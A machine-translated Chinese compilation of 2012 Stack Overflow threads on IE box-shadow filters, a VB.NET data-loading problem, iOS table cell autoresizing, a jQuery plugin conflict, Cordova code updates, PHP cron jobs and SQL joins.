-ms-filter: "progid:DXImageTransform.Microsoft.Shadow(Strength=4, Direction=135, Color='#000000')"; 
```

但我错过了 IE 版本的插图。

有人对此有任何运气吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-26T20:31:38.380

唯一有用的提示如下：

如果不是绝对必要，请忽略 IE8 的此效果。没有等效的 MS 过滤器，如果 css3PIE 不适合你，如果你不想使用图像，你就会迷失方向。

然而，最后一个解决方案是让用户安装[chrome-frame](https://developers.google.com/chrome/chrome-frame/)，我认为这种“噱头”是不可接受的。

在开发您的网站时，如果您不想失去 IE 社区，就永远不要依赖内框阴影之类的功能。将其用于装饰，但不要做任何会严重影响可用性的事情，如果不存在的话。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-14T22:48:38.900

有一个解决方案适用于没有 css3PIE 的 IE。在 IE 7/8 中，应用阴影的元素需要设置背景颜色。否则阴影会被子元素（包括文本）继承。

这是我在所有浏览器中实现盒子阴影的方法……当然，您需要根据自己的颜色、强度、方向等进行自定义。

```
.shadow {
     -moz-box-shadow: 2px 2px 3px #A7A7A7;
     -webkit-box-shadow: 2px 2px 3px #A7A7A7;
     box-shadow: 2px 2px 3px #A7A7A7;
     -ms-filter: "progid:DXImageTransform.Microsoft.Shadow(Strength=3, Direction=135, Color='#A7A7A7')";
     filter: progid:DXImageTransform.Microsoft.Shadow(Strength=3, Direction=135, Color='#A7A7A7');
}

.wrapper{
    margin: 10px;
    border: solid 1px #A7A7A7;
    background-color: white;//or whatever color you need; however transparent doesn't work
   } 
```

然后只需应用两个类

```
<div class="wrapper shadow">
     <div>
          <p>Some text that used to have a shadow, but doesn't anymore</p>
     </div>
</div> 
```

# vb.net - VB 应用程序在我的计算机上连接到服务器正常，但在任何其他计算机上都没有

> ID：13093991
> 
> 赞同：2
> 
> 时间：2012-10-26T20:28:41.147
> 
> 标签：vb.net, visual-studio-2010, visual-studio, sql-server-2008

我已经黔驴技穷了。我构建的应用程序可以在我的系统上完美运行，但不能在其他任何人上运行。这非常简单，在加载时它会向用户查询批号，然后过滤数据以在 datagridview 中仅显示具有该批号的项目。

这是我写的代码：

```
'*******************************************************************************************************************************
' When the form loads, the following code opens a inputbox that asks the user for a batch number. This number then gets used
' to filter the data before populating the DataGridView
'*******************************************************************************************************************************
Private Sub frmAQFilter_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
    Me.DataTable1TableAdapter.Fill(Me.ElementDataset.qryAQFilterData)

    Dim blnX As Boolean = True
    Dim msg As Integer

    Do While blnX
        strBatch = ""
        strBatch = InputBox("Batch Number: ")

        If Len(strBatch) > 0 Then
            DataTable1BindingSource.Filter = String.Format("Batch = '" & strBatch & "'")
            If Not DataTable1BindingSource.Count > 0 Then
                msg = MsgBox("No records found with the batch number: " + strBatch + Chr(13) _
                             + "Do you wish to enter a different batch number", MsgBoxStyle.YesNo)
                If msg = vbNo Then
                    Me.Close()
                    blnX = False
                End If
            Else
                blnX = False
            End If
        Else
            Me.Close()
            blnX = False
        End If
    Loop
    Me.WindowState = FormWindowState.Normal
End Sub 
```

我没有收到任何错误，它只是没有填充数据集。我的第一个想法是连接字符串不好。那里没有问题。任何建议将不胜感激。

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-02T16:53:10.190

感谢您尝试帮助我解决此问题。事实证明，问题不是我的代码。在我的计算机上安装 Visual Studio 时，它安装不正确，导致它生成损坏的 64 位版本而不是 32 位版本。非常严重，但问题已得到纠正。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-28T08:09:36.273

禁用防火墙。还要尝试在 vb.net 中设置 SQL 服务器的网络地址，以便为两个客户端使用单个外部 SQL 服务器。我认为这将有助于我们知道在哪里进行调查。

# objective-c - 在 UITableViewCell 中自动调整掩码大小

> ID：13093992
> 
> 赞同：0
> 
> 时间：2012-10-26T20:28:49.103
> 
> 标签：objective-c, ios, uitableview, autoresize

我正在创建一个具有以下屏幕的应用程序。但是，我无法让图像按照我的意愿排列。我想要的是图像尽可能大，不会失真，也不会覆盖文本或泄漏到单元格之外。我认为我的代码可以正确缩小图像；但是，我不知道要给它们戴上什么自动调整大小的蒙版。

![在此处输入图像描述](../Images/1d8c476a5dad4fa5805516f103961e85.png)

以下是相关代码：

```
- (UITableViewCell *) tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:@"Prototype Cell"];
    if(!cell)
    {
        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:@"Prototype Cell"];
    }
    Restaurant *restaurantForIndex = [self.restaurants objectAtIndex:indexPath.row];
    UILabel *label = [[UILabel alloc] init];
    label.backgroundColor = [UIColor greenColor];
    label.text = restaurantForIndex.name;
    label.font = [UIFont fontWithName:CELL_FONT_NAME size:CELL_FONT_SIZE];
    [cell.contentView addSubview:label];

    cell.backgroundColor = [UIColor whiteColor];

    UIImage *image = [restaurantForIndex getLogo];
    if(image.size.height > CELL_HEIGHT - 2 *CELL_Y_BUFFER)
    {
        float scale = (CELL_HEIGHT - 2 * CELL_Y_BUFFER) / image.size.height;
        image = [UIImage scaleImage:image toSize:CGSizeMake(image.size.width * scale, CELL_HEIGHT - 2 * CELL_Y_BUFFER)];
    }
    float textWidth = [label.text sizeWithFont:[UIFont fontWithName:CELL_FONT_NAME size:CELL_FONT_SIZE]].width;
    label.frame = CGRectMake(CELL_X_BUFFER, CELL_Y_BUFFER, textWidth, cell.contentView.frame.size.height - 2 * CELL_Y_BUFFER);
    label.autoresizingMask = UIViewAutoresizingFlexibleHeight;
    if(label.frame.origin.x + textWidth + NAME_LOGO_BUFFER + image.size.width + CELL_X_BUFFER > cell.contentView.frame.size.width)
    {
        float newImageWidth = cell.contentView.frame.size.width - (label.frame.origin.x + textWidth + NAME_LOGO_BUFFER + CELL_X_BUFFER);
        float scale = newImageWidth / image.size.width;
        image = [UIImage scaleImage:image toSize:CGSizeMake(newImageWidth, image.size.height * scale)];
    }
    UIImageView *imageView = [[UIImageView alloc] initWithImage:image];
    float xOrigin = cell.contentView.frame.size.width - image.size.width - CELL_X_BUFFER;
    float yOrigin = (cell.contentView.frame.size.height - image.size.height) / 2 ;
    float width = image.size.width;
    float height = image.size.height;
    imageView.frame = CGRectMake(xOrigin, yOrigin, width, height);

    //IMPORTANT LINE OF CODE HERE
    imageView.autoresizingMask =  UIViewAutoresizingFlexibleBottomMargin | UIViewAutoresizingFlexibleTopMargin  | UIViewAutoresizingFlexibleLeftMargin;
    [cell.contentView addSubview:imageView];
    return cell;
} 
```

关于代码的一些注意事项：无论你在哪里看到大写的 BUFFER 单词，它都是一个常量，因此子视图不会触及单元格的边缘。

# jquery - JQuery SerialScroll 潜在插件与视频播放器 MediaElement.js 冲突

> ID：13093993
> 
> 赞同：2
> 
> 时间：2012-10-26T20:28:50.500
> 
> 标签：jquery, jquery-plugins, html5-video, mediaelement.js, serialscroll

我发生了一个小问题，可能是由于两个插件干扰。它们与开箱即用的默认值一起工作得很好。我使用 JQuery SerialScroll 来控制水平滚动项目，并使用 MediaElement.js 作为 HTML5 视频播放器。

当我配置 MediaElement.js 插件时，尽管它会导致 JQuery SerialScroll 运行异常，并且不再像未配置时那样使用上一个和下一个按钮滚动到下一个或上一个 li。

配置代码是这样的：

```
$('video').mediaelementplayer({
// the order of controls you want on the control bar (and other plugins below)
features: ['playpause','progress','current','duration','tracks','fullscreen'],
alwaysShowControls: false,
// when this player starts, it will pause other players
pauseOtherPlayers: true
}); 
```

当它被注释掉时，SerialScroll 和 MediaElement.js 可以完美地协同工作，但当然，我需要使用一些视频播放器功能来使其按我需要的方式工作。

这里有两个链接来显示发生了什么，第一个是显示未配置播放器时它是如何工作的（上面的代码注释掉了）

[http://www.joshmeltzer.com/thesis/working_set/serialscroll_works.html](http://www.joshmeltzer.com/thesis/working_set/serialscroll_works.html)

第二个是当我取消注释上面的代码并尝试使用它的实现

[http://www.joshmeltzer.com/thesis/working_set/serialscroll.html](http://www.joshmeltzer.com/thesis/working_set/serialscroll.html)

每个页面都是一个单独的 li 并且在第二个链接上滚动移动但是以非常奇怪和可变的间隔...我假设这两个插件在某个深处发生冲突？

提前感谢您的帮助。乔什

# xamarin.ios - 如何更改 monotouch 中突出显示的匹配大括号的颜色？

> ID：13093994
> 
> 赞同：0
> 
> 时间：2012-10-26T20:29:03.137
> 
> 标签：xamarin.ios, monodevelop, curly-braces

匹配大括号的突出显示颜色很难看到。如何将颜色更改为蓝色或红色或其他更明显的颜色？

我已经查看了 Xamian 文档。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-27T17:31:14.870

您可以通过转到选项>>文本编辑器>>语法突出显示更改或创建新的配色方案来自定义这些。希望这可以帮助。

# javascript - 在 Cordova 应用程序中更新已在应用程序商店中发布的 JavaScript 代码

> ID：13093995
> 
> 赞同：4
> 
> 时间：2012-10-26T20:29:06.400
> 
> 标签：javascript, cordova, updates

我正在开发一些应用程序，客户希望在应用程序交付后实现设计更改、添加新的内容字段等。目前这些应用程序也是通过 RhoMobile 完成的，但我打算切换到 Cordova。

到目前为止，我只是按照它的出现来做这一切，然后将其发送给当权者的批准。但是对于来自客户的相对较小的更改，然后等待应用程序再次获得批准......当然，当他们考虑得不够彻底时，这也是一个管理问题，但我只是想看看有没有办法的抵消。:)

例如，我刚刚被要求在应用程序中添加会员概览页面。我已经在交付的应用程序中为会员页面定义了一个页面，所以如果我可以更新手机上已经运行的 javascript，添加额外的数据就不会那么难了。

1.  根据 Apple 的政策，我可以这样做吗？
2.  是否有任何预先构建的框架来处理这个问题，还是我注定要自己看？:)
3.  还有其他我没有想到的替代方案吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2015-09-10T10:29:18.567

问题是旧的，但问题仍然是实际的。最近发布了一个 Cordova 插件，叫做[Hot code push plugin](https://github.com/nordnet/cordova-hot-code-push)。你可以看看他。使用它，您可以更新应用程序中包含的所有 Web 内容：JS、CSS、HTML、图像等。但是，如果您想在应用程序中添加一些新插件 - 您必须在商店中发布新版本。

不幸的是，目前这个插件只支持 iOS 和 Android，但也许这已经足够了。

关于 Apple 政策：您可以像这样更新您的应用程序，但前提是这不会改变应用程序的初始用途。如果应用程序是作为计算器发布的，但在更新后它变成了游戏 - Apple 可以禁止你。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-27T14:45:02.390

提交到应用商店的包是经过代码签名的。这是确保包完整性的众多机制之一。这导致在没有应用程序更新的情况下更新执行代码不是一个可行的选择。

您可以包含容量非常有限的外部 JS 文件（想想[childbrowser](https://github.com/phonegap/phonegap-plugins/tree/master/iPhone/ChildBrowser)）。PhoneGap build 有一个名为[Hydration builds](https://build.phonegap.com/docs/hydration)的功能。但这仅在开发过程中有效。

对于完整的应用程序更新，[HockeyKit](http://hockeykit.net/)也是一个选项。

# php - 可以使用 ajax、jquery 页面和 cron 吗？

> ID：13093997
> 
> 赞同：1
> 
> 时间：2012-10-26T20:29:27.217
> 
> 标签：php, javascript, mysql, ajax, cron

我的页面所做的是：

1.  从不同的服务器下载一个数组（first.php）
2.  php脚本解析值
3.  解析值通过 ajax 调用发送
4.  在下一个（称为ajax）页面（second.php）上有一些mysql查询
5.  如果值通过条件，则将值写入数据库

....所以，当我运行我的 first.php .. 它加载 second.php 时，一切都很好.. 但我想知道是否可以让它由 cron 生成？

如果没有，我该怎么办？谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-26T20:36:25.617

在这方面，您需要了解某些事情。

首先是 PHP 可以作为 a`web server module`或作为`standalone executable`. 当您将其作为 Web 服务器模块运行时，您可以从浏览器中打开它，所有相关的 Web 技术`(html/css/js)`等都会被解析并协同工作。

当您使用 cron 从命令行运行它时`/usr/bin/php mywebpage.php` ，php 可执行文件不会解析/理解其他 Web 技术，因此您的页面将失败。

有两种解决方法：

1.  只重写那些支持 web 的部分，以便 ajax/js 的东西由 PHP 处理。基本上经验法则是，如果您正在运行 CLI php 脚本，它应该只包含核心 PHP。这是首选方式。您需要将 ajax 调用移动到同一个文件中，并像任何常规程序一样使其成为单个执行流。

2.  如果由于某种原因您无法执行上述操作，您可以尝试以下操作： `/path/to/browser http://mysite/mywebpage.php`. 你正在做的是，你正在运行一个浏览器可执行文件，然后调用网页 URL。这样，页面在浏览器的环境中执行，它将能够解析和理解 ajax/js 调用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T20:34:21.687

是的，您可以通过以下方式创建一个 cron 作业。

1）从不同的服务器（first.php）下载一个数组

2) php 脚本解析 first.php 中的值

3）通过include_once包含第二个文件second.php，它执行mysql查询

4）如果一切正确，将它们插入数据库。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-26T20:43:44.743

听起来您需要一个独立的 JavaScript shell。在以下位置列出了一个数字：

[https://developer.mozilla.org/en-US/docs/JavaScript/Shells](https://developer.mozilla.org/en-US/docs/JavaScript/Shells)

# sql - 在具有不同（但连接）值的列上连接两个表

> ID：13093999
> 
> 赞同：0
> 
> 时间：2012-10-26T20:29:45.720
> 
> 标签：sql

如何在具有某些链接值但不具有相同值的列上连接两个表？

例如，我需要`tbl1`加入`tbl2`where`tbl1.col=100`和`tbl2.col=200`. 唯一的联系是我/我的公司。

有没有办法在没有明确共享值的情况下链接行？我需要 col 值为 '100' 的所有行位于同一行，因为所有 tbl2 列的 col 值为 200。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-26T20:33:36.387

您可以在连接谓词中添加一些逻辑，如下所示：

```
select *
from tbl1 as a
    join tbl2 as b on a.col + 100 = b.col 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-26T20:33:53.060

```
select
  *
from
  tbl1
    inner join
  tbl2
    on tbl1.col = 100 and tbl2.col = 200 
```

奇怪，但它会工作

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-26T20:35:04.203

> 有没有办法在没有明确共享值的情况下链接行？

**是**的。您可以编写一个自定义`JOIN`来自己关联数据。

您没有指定特定的 DBMS，因此以下示例包含通用 SQL。

```
SELECT * FROM tbl1, tbl2 WHERE tbl1.col = 100 AND tbl12.col = 200 
```

或者，更动态地：

```
SELECT * FROM tbl1, tbl2 WHERE tbl1.col + 100 = tbl12.col;
-- with JOIN
SELECT * FROM tbl1 JOIN tbl2 ON (tbl1.col + 100) = tbl12.col; 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-26T20:37:38.487

如果我正确理解您的问题，您有两个在逻辑上相互关联的表，但表中的当前键没有（但您有将它们放在一起的业务规则）。我认为您需要创建一个映射该关系的交叉引用表。交叉引用表会将其他表的主键映射在一起，以显示数据之间的逻辑关系。

我认为所有其他海报都假设这种关系是你可以计算的，但我认为这不是你要问的。如我错了请纠正我。